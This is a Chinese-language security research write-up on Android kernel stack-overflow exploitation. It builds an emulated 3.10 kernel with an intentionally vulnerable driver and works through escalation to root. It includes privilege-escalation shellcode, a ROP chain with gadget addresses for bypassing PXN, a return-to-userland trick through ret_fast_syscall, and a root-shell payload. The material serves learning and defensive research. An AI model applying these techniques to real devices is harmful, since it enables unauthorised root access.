**作者：Hcamael@知道创宇404实验室**  
**英文版本：<https://paper.seebug.org/947/>**

最近在研究一个最简单的android内核的栈溢出利用方法，网上的资料很少，就算有也是旧版内核的，新版的内核有了很大的不同，如果放在x86上本应该是很简单的东西，但是arm指令集有很大的不同，所以踩了很多坑

把上一篇改了一下名字，换成了从0开始学Linux内核，毕竟不是专业搞开发的，所以驱动开发没必要学那么深，只要会用，能看懂代码基本就够用了。本篇开始学Linux
kernel
pwn了，而内核能搞的也就是提权，而提权比较多人搞的就是x86和arm指令集的Linux系统提权了，arm指令集的基本都是安卓root和iOS越狱，而mips指令集的几乎没啥人在搞，感觉是应用场景少。

# 环境准备

## android内核编译

### 下载相关源码依赖

android内核源码使用的是goldfish[1]，直接clone下来，又大又慢又久，在git目录下编译也麻烦，所以想搞那个版本的直接下那个分支的压缩包就好了

本文使用的工具的下载地址：

  * 源码：<https://android.googlesource.com/kernel/goldfish/+archive/android-goldfish-3.10.tar.gz>
  * 交叉编译工具：<https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6>
  * 一键编译脚本：<https://android.googlesource.com/platform/prebuilts/qemu-kernel/+/master>

PS：git
clone速度慢的话可以使用国内镜像加速：`s/android.googlesource.com/aosp.tuna.tsinghua.edu.cn/`

    
    
    # 下载源码
    $ wget https://android.googlesource.com/kernel/goldfish/+archive/android-goldfish-3.10.tar.gz
    $ tar zxf goldfish-android-goldfish-3.10.tar.gz
    # 下载编译工具
    $ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6
    # 下载一键编译脚本
    $ git clone https://android.googlesource.com/platform/prebuilts/qemu-kernel/
    # 只需要kernel-toolchain和build-kernel.sh
    $ cp qemu-kernel/build-kernel.sh goldfish/
    $ cp -r qemu-kernel/kernel-toolchain/ goldfish/

### 修改内核

学android kernel pwn最初看的是Github上的一个项目[3]，不过依赖的是旧内核，估计是android
3.4以下的内核，在3.10以上的有各种问题，所以我自己做了些修改，也开了一个Github源：<https://github.com/Hcamael/android_kernel_pwn>

对kernel源码有两点需要修改：

1.添加调试符号

首先需要知道自己要编译那个版本的，我编译的是32位Android内核，使用的是`goldfish_armv7`，配置文件在:
`arch/arm/configs/goldfish_armv7_defconfig`

但是不知道为啥3.10里没有该配置文件，不过用ranchu也一样：

给内核添加调试符号，只需要在上面的这个配置文件中添加：`CONFIG_DEBUG_INFO=y`，如果是goldfish就需要自己添加，ranchu默认配置已经有了，所以不需要更改。

2.添加包含漏洞的驱动

目的是研究Android提权利用方法，所以是自己添加一个包含栈溢出的驱动，该步骤就是学习如何添加自己写的驱动

上面给了一个我的Github项目，把该项目中的`vulnerabilities/`目录复制到内核源码的驱动目录中：

    
    
    $ cp vulnerabilities/ goldfish/drivers/

修改Makefile：

    
    
    $ echo "obj-y += vulnerabilities/" >> drivers/Makefile

导入环境变量后，使用一键编译脚本进行编译：

    
    
    $ export PATH=/root/arm-linux-androideabi-4.6/bin/:$PATH
    $ ./build-kernel.sh --config="ranchu"

PS:
在docker中复现环境的时候遇到一个问题，可以参考：<https://stackoverflow.com/questions/42895145/cross-compile-the-kernel>

编译好后的内核在`/tmp/qemu-kernel`目录下，有两个文件，一个zImage，内核启动镜像，一个vmlinux是kernel的binary文件，丢ida里面分析内核，或者给gdb提供符号信息

## Android模拟环境准备

内核编译好后，就是搞Android环境了，可以直接使用Android
Studio[2]一把梭，但是如果不搞开发的话，感觉Studio太臃肿了，下载也要下半天，不过还好，官方提供了命令行工具，觉得Studio太大的可以只下这个

PS: 记得装java，最新版的java 11不能用，我用的是java 8

建一个目录，然后把下载的tools放到这个目录中

    
    
    $ mkdir android_sdk
    $ mv tools android_sdk/

首先需要使用`tools/bin/sdkmanager`装一些工具

    
    
    # 用来编译android binary(exp)的，如果直接用arm-liunx-gcc交叉编译工具会缺一些依赖，解决依赖太麻烦了，还是用ndk一把梭方便
    $ ./bin/sdkmanager --install "ndk-bundle"
    # android模拟器
    $ ./bin/sdkmanager --install "emulator"
    # avd
    $ ./bin/sdkmanager --install "platforms;android-19"
    $ ./bin/sdkmanager --install "system-images;android-19;google_apis;armeabi-v7a"
    # 其他
    $ ./bin/sdkmanager --install "platform-tools"

PS：因为是32位的，所以选择的是armeabi-v7a

PSS: 我一共测试过19, 24,
25，发现在24,25中，自己写的包含漏洞的驱动只有特权用户能访问，没去仔细研究为啥，就先使用低版本的android-19了

创建安卓虚拟设备：

    
    
    ./bin/avdmanager create avd -k "system-images;android-19;google_apis;armeabi-v7a" -d 5 -n "kernel_test"

启动：

    
    
    $ export kernel_path=ranchu_3.10_zImage
    或者
    $ export kernel_path=goldfish_3.10_zImage
    $ ./emulator  -show-kernel -kernel $kernel_path -avd kernel_test -no-audio -no-boot-anim -no-window -no-snapshot -qemu  -s

去测试下我写的exp：

    
    
    $ cd ~/goldfish/drivers/vulnerabilities/stack_buffer_overflow/solution
    $ ./build_and_run.sh

编译好了之后运行，记得要用普通用户运行：

    
    
    shell@generic:/ $ id
    id
    uid=2000(shell) gid=1007(log) context=u:r:init_shell:s0
    shell@generic:/ $ /data/local/tmp/stack_buffer_overflow_exploit
    /data/local/tmp/stack_buffer_overflow_exploit
    start
    shell@generic:/ # id
    id
    uid=0(root) gid=0(root) context=u:r:kernel:s0

# Android 内核提权研究

环境能跑通以后，就来说说我的exp是怎么写出来的。

首先说一下，我的环境都是来源于AndroidKernelExploitationPlayground项目[3]，但是实际测试的发现，该项目中依赖的估计是3.4的内核，但是现在的`emulator`要求内核版本大于等于3.10

从内核3.4到3.10有许多变化，首先，对内核的一些函数做了删减修改，所以需要改改驱动的代码，其次就是3.4的内核没有开PXN保护，在内核态可以跳转到用户态的内存空间去执行代码，所以该项目中给的exp是使用shellcode，但是在3.10内核中却开启了PXN保护，无法执行用户态内存中的shellcode

## 提权思路

搞内核Pwn基本都是一个目的——提权。那么在Linux在怎么把权限从普通用户变成特权用户呢？

一般提权的shellcode长这样：

    
    
    asm
    (
    "    .text\n"
    "    .align 2\n"
    "    .code 32\n"
    "    .globl shellCode\n\t"
    "shellCode:\n\t"
    // commit_creds(prepare_kernel_cred(0));
    // -> get root
    "LDR     R3, =0xc0039d34\n\t"   //prepare_kernel_cred addr
    "MOV     R0, #0\n\t"
    "BLX     R3\n\t"
    "LDR     R3, =0xc0039834\n\t"   //commit_creds addr
    "BLX     R3\n\t"
    "mov r3, #0x40000010\n\t"
    "MSR    CPSR_c,R3\n\t"
    "LDR     R3, =0x879c\n\t"     // payload function addr
    "BLX     R3\n\t"
    );

这个shellcode提权的思路有三步：

  1. prepare_kernel_cred(0) 创建一个特权用户cred
  2. commit_creds(prepare_kernel_cred(0)); 把当前用户cred设置为该特权cred
  3. MSR CPSR_c,R3 从内核态切换回用户态(详情自己百度这句指令和CPSR寄存器)

切换回用户态后，当前程序的权限已经变为root，这时候就可以执行`/bin/sh`

再继续深入研究，就涉及到内核的三个结构体：

    
    
    $ cat ./arch/arm/include/asm/thread_info.h
    ......
    struct thread_info {
            ......
            struct task_struct      *task;          /* main task structure */
           ......
    };
    ......
    $ cat ./include/linux/sched.h
    ......
    struct task_struct {
            ......
            const struct cred __rcu *real_cred;
            ......
    };
    ......
    $ cat ./include/linux/cred.h
    ......
    struct cred {
            atomic_t        usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
            atomic_t        subscribers;    /* number of processes subscribed */
            void            *put_addr;
            unsigned        magic;
    #define CRED_MAGIC      0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
            kuid_t          uid;            /* real UID of the task */
            kgid_t          gid;            /* real GID of the task */
            kuid_t          suid;           /* saved UID of the task */
            kgid_t          sgid;           /* saved GID of the task */
            kuid_t          euid;           /* effective UID of the task */
            kgid_t          egid;           /* effective GID of the task */
            kuid_t          fsuid;          /* UID for VFS ops */
            kgid_t          fsgid;          /* GID for VFS ops */
            unsigned        securebits;     /* SUID-less security management */
            kernel_cap_t    cap_inheritable; /* caps our children can inherit */
            kernel_cap_t    cap_permitted;  /* caps we're permitted */
            kernel_cap_t    cap_effective;  /* caps we can actually use */
            kernel_cap_t    cap_bset;       /* capability bounding set */
            kernel_cap_t    cap_ambient;    /* Ambient capability set */
    #ifdef CONFIG_KEYS
            unsigned char   jit_keyring;    /* default keyring to attach requested
                                             * keys to */
            struct key __rcu *session_keyring; /* keyring inherited over fork */
            struct key      *process_keyring; /* keyring private to this process */
            struct key      *thread_keyring; /* keyring private to this thread */
            struct key      *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
            void            *security;      /* subjective LSM security */
    #endif
            struct user_struct *user;       /* real user ID subscription */
            struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
            struct group_info *group_info;  /* supplementary groups for euid/fsgid */
            struct rcu_head rcu;            /* RCU deletion hook */
    };
    ......

每个进程都有一个单独`thread_info`结构体，我们来看看内核是怎么获取到每个进程的`thread_info`结构体的信息的：

    
    
    #define THREAD_SIZE             8192
    ......
    static inline struct thread_info *current_thread_info(void)
    {
            register unsigned long sp asm ("sp");
            return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
    }

有点内核基础知识的应该知道，内核的栈是有大小限制的，在arm32中栈的大小是0x2000，而`thread_info`的信息储存在栈的最底部

所以，如果我们能获取到当前进程在内核中运行时的其中一个栈地址，我们就能找到`thread_info`，从而顺藤摸瓜得到`cred`的地址，如果能任意写内核，则可以修改`cred`的信息，从而提权

总得来说，内核提权其实只有一条路可走，就是修改cred信息，而`commit_creds(prepare_kernel_cred(0));`不过是内核提供的修改cred的函数罢了。

我们来通过gdb展示下cred数据：

    
    
    $ shell@generic:/ $ id
    id
    uid=2000(shell) gid=1007(log) context=u:r:init_shell:s0
    --------------------------------------
通过gdb可以获取到：`$sp : 0xd415bf40`

从而计算出栈底地址：0xd415a000

然后我们就能获取到`thread_info`的信息，然后得到`task_struct`的地址：0xd4d16680

![
](https://images.seebug.org/content/images/2019/02/8e7759ae-9c62-4287-a3a4-58fb7b05008a.png-w331s)

接着我们查看task_struct的信息，得到了cred的地址：0xd4167780

    
    
    gef> p *(struct task_struct *)0xd4d16680
    $2 = {
    ......
            real_cred = 0xd4167780, 
            cred = 0xd4167780,
    ......
    # 数据太长了，就不截图了

然后查看cred的信息：

![
](https://images.seebug.org/content/images/2019/02/3de8b38b-b41b-48b4-a034-c075f7b8557f.png-w331s)

把uid和gid的十六进制转换成十进制，发现就是当前进程的权限

## 使用ROP绕过PXN来进行android提权

既然我们已经知道了怎么修改权限，那么接下来就研究一下如何利用漏洞来提权，因为是研究利用方式，所以自己造了一个最基础的栈溢出

    
    
    int proc_entry_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
    {
        char buf[MAX_LENGTH];
    
        if (copy_from_user(&buf, ubuf, count)) {
            printk(KERN_INFO "stackBufferProcEntry: error copying data from userspace\n");
            return -EFAULT;
        }
        return count;
    }

因为开了PXN，所以没办法使用shellcode，然后我第一个想到的思路就是使用ROP来执行shellcode的操作

这里说一下，不要使用`ROPgadget`，用这个跑内核的ELF，要跑贼久，推荐使用ROPPER[4]

    
    
    $ ropper -f /mnt/hgfs/tmp/android_kernel/ranchu_3.10_vmlinux --nocolor > ranchu_ropper_gadget

然后就是找`commit_creds`,
`prepare_kernel_cred`这两个函数的地址，在没有开启kalsr的内核中，我们可以直接把vmlinux丢到ida里面，找这两个函数的地址

到这里，我们可以构造出如下的rop链：

    
    
    *pc++ = 0x41424344;      // r4
    *pc++ = 0xC00B8D68;      // ; mov r0, #0; pop {r4, pc}
    *pc++ = 0x41424344;      // r4
    *pc++ = 0xC00430F4;      // ; prepare_kernel_cred(0) -> pop {r3-r5, pc}
    *pc++ = 0x41424344;      // r3
    *pc++ = 0x41424344;      // r4
    *pc++ = 0x41424344;      // r5
    *pc++ = 0xC0042BFC;      // ; commit_creds -> pop {r4-r6, pc}
    *pc++ = 0x41424344;      // r4
    *pc++ = 0x41424344;      // r5
    *pc++ = 0x41424344;      // r6

在成功修改当前进程的权限之后，我们需要把当前进程从内核态切换回用户态，然后在用户态执行`/bin/sh`，就能提权成功了

但是这里遇到一个问题，在shellcode中，使用的是:

    
    
    "mov r3, #0x40000010\n\t"
    "MSR    CPSR_c,R3\n\t"
    "LDR     R3, =0x879c\n\t"     // payload function addr
    "BLX     R3\n\t"

我也很容易能找到gadget: `msr cpsr_c, r4; pop {r4, pc};`

但是却没法成功切换回用户态，网上相关的资料几乎没有，我也找不到问题的原因，在执行完`msr cpsr_c,
r4`指令以后，栈信息会发现变化，导致没法控制pc的跳转

不过后来，我跟踪内核的执行，发现内核本身是通过`ret_fast_syscall`函数来切换回用户态的：

    
    
    $ cat ./arch/arm/kernel/entry-common.S
    ......
    ret_fast_syscall:
     UNWIND(.fnstart        )
     UNWIND(.cantunwind     )
            disable_irq                             @ disable interrupts
            ldr     r1, [tsk, #TI_FLAGS]
            tst     r1, #_TIF_WORK_MASK
            bne     fast_work_pending
            asm_trace_hardirqs_on
    
            /* perform architecture specific actions before user return */
            arch_ret_to_user r1, lr
            ct_user_enter
    
            restore_user_regs fast = 1, offset = S_OFF
     UNWIND(.fnend          )
    ......
    -----------------------------       0xc000df80 <ret_fast_syscall>:   cpsid   i
       0xc000df84 <ret_fast_syscall+4>: ldr r1, [r9]
       0xc000df88 <ret_fast_syscall+8>: tst r1, #7
       0xc000df8c <ret_fast_syscall+12>: bne 0xc000dfb0 <fast_work_pending>
       0xc000df90 <ret_fast_syscall+16>:    ldr r1, [sp, #72]   ; 0x48
       0xc000df94 <ret_fast_syscall+20>:    ldr lr, [sp, #68]!  ; 0x44
       0xc000df98 <ret_fast_syscall+24>:    msr SPSR_fsxc, r1
       0xc000df9c <ret_fast_syscall+28>:    clrex
       0xc000dfa0 <ret_fast_syscall+32>: ldmdb  sp, {r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12, sp, lr}
       0xc000dfa4 <ret_fast_syscall+36>:    nop; (mov r0, r0)
       0xc000dfa8 <ret_fast_syscall+40>:    add sp, sp, #12
       0xc000dfac <ret_fast_syscall+44>:    movs    pc, lr

经过我测试发现，使用`msr SPSR_fsxc,
r1`可以成功从内核态切换回用户态，但是该指令却只存在于该函数之前，无法找到相关的gadget，之后我想了很多利用该函数的方法，最后测试成功的方法是：

计算有漏洞的溢出函数的栈和`ret_fast_syscall`函数栈的距离，在使用ROP执行完`commit_creds(prepare_kernel_cred(0));`之后，使用合适的gadget来修改栈地址(比如:
`add sp, sp, #0x30; pop {r4, r5, r6, pc};`)，然后控制pc跳转到`0xc000df90
<ret_fast_syscall+16>:`，这样程序就相当于执行完了内核的syscall，然后切换回用户进程代码继续执行，在我们的用户态代码中后续执行如下函数，就能成功提权：

    
    
    void payload(void)
    {        
            if (getuid() == 0) {
                    execl("/system/bin/sh", "sh", NULL);
            } else {
                    warnx("failed to get root. How did we even get here?");
            }
            _exit(0);
    }

完整exp可以见我的Github。

ROP只是其中一种利用方法，后续还会研究其他利用方法和在64位android下的利用。

# 参考

  1. <https://android.googlesource.com/kernel/goldfish/>
  2. <https://developer.android.com/studio/?hl=zh-cn#downloads>
  3. <https://github.com/Fuzion24/AndroidKernelExploitationPlayground>
  4. <https://github.com/sashs/Ropper>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/808/>

